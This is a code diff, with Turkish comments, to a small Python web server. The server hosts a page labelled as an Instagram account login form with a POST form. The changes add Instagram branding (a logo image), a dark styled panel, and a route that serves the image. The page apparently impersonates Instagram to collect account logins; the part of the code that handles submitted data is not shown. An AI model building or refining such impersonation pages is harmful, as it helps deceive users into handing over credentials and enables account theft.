@@ -19,7 +19,7 @@ body {
   min-height: 100vh;
   display: grid;
   place-items: center;
-  background: #f5f6f8;
+  background: #222629; /* Antrasit Arka Plan */
   font-family: Arial, sans-serif;
 }
 .panel {
@@ -29,6 +29,15 @@ body {
   border: 1px solid #ddd;
   border-radius: 10px;
   text-align: center;
+}
+/* Resim Stili */
+.panel img {
+  width: 90px;
+  height: 90px;
+  object-fit: cover;
+  border-radius: 50%;
+  margin-bottom: 10px;
+  border: 2px solid #ddd;
 }
 input, button {
   box-sizing: border-box;
@@ -49,6 +58,9 @@ small { color: #666; }
 </head>
 <body>
 <main class="panel">
+  <!-- Eklediğin görsel doğrudan burada gösteriliyor -->
+  <img src="images.jpg" alt="Instagram">
+  
   <h2>Hesap Paneli</h2>
   <p>instagram hesabına giriş</p>
   <form method="POST">
@@ -82,6 +94,19 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(metin.encode("utf-8"))
 
     def do_GET(self):
+        # Eğer tarayıcı resim dosyasını isterse doğrudan sun
+        if self.path == "/images.jpg":
+            try:
+                with open("images.jpg", "rb") as img_file:
+                    self.send_response(200)
+                    self.send_header("Content-Type", "image/jpeg")
+                    self.end_headers()
+                    self.wfile.write(img_file.read())
+                return
+            except Exception:
+                self.send_error(404)
+                return
+        
         self.cevap(HTML)
 
     def do_POST(self):
